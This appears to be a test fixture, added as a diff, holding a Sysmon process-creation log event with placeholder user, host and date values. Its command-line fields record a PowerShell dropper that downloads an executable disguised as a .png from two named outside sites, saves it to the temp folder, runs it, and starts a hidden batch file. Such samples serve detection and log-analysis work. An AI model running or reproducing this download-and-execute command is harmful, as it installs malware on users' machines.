@@ -1,0 +1,48 @@
+{
+  "Event": {
+    "EventData": {
+      "CommandLine": "PowerShell  \"'PowerShell \"\"function Ktuakce([String] $dwjdasoigb){(New-Object System.Net.WebClient).DownloadFile($dwjdasoigb,''C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Yvfytc.exe'');Start-Process ''C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Yvfytc.exe'';}try{Ktuakce(''http://www.events4u.cz/kas23.png'')}catch{Ktuakce(''http://tregartha-dinnie.co.uk/kas23.png'')}'\"\" | Out-File -encoding ASCII -FilePath C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Ryvqma-cgs.bat;Start-Process 'C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Ryvqma-cgs.bat' -WindowStyle Hidden\"",
+      "CurrentDirectory": "C:\\Users\\Gen Eric\\Desktop\\",
+      "Hashes": "SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C",
+      "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "IntegrityLevel": "Medium",
+      "LogonGuid": "49F1AF32-4475-59DB-0000-0020B8040100",
+      "LogonId": "0x000104b8",
+      "ParentCommandLine": "cmd /c PowerShell \"'PowerShell \"\"function Ktuakce([String] $dwjdasoigb){(New-Object System.Net.WebClient).DownloadFile($dwjdasoigb,''%TMP%\\Yvfytc.exe'');Start-Process ''%TMP%\\Yvfytc.exe'';}try{Ktuakce(''http://www.events4u.cz/kas23.png'')}catch{Ktuakce(''http://tregartha-dinnie.co.uk/kas23.png'')}'\"\" | Out-File -encoding ASCII -FilePath %TMP%\\Ryvqma-cgs.bat;Start-Process '%TMP%\\Ryvqma-cgs.bat' -WindowStyle Hidden\"",
+      "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+      "ParentProcessGuid": "49F1AF32-5913-59DB-0000-0010023D3100",
+      "ParentProcessId": "1564",
+      "ProcessGuid": "49F1AF32-5913-59DB-0000-00101D483100",
+      "ProcessId": "788",
+      "TerminalSessionId": "1",
+      "User": "GenEric-PC\\Gen Eric",
+      "UtcTime": "4242-04-24 13:37:42.422"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "Computer": "BLAHBLAH",
+      "Correlation": {},
+      "EventID": "1",
+      "EventRecordID": "230989",
+      "Execution": {
+        "ProcessID": "2160",
+        "ThreadID": "2380"
+      },
+      "Keywords": "0x8000000000000000",
+      "Level": "4",
+      "Opcode": "0",
+      "Provider": {
+        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
+        "Name": "Microsoft-Windows-Sysmon"
+      },
+      "Security": {
+        "UserID": "S-1-5-18"
+      },
+      "Task": "1",
+      "TimeCreated": {
+        "SystemTime": "4242-04-24 13:37:42.422"
+      },
+      "Version": "5"
+    }
+  }
+}
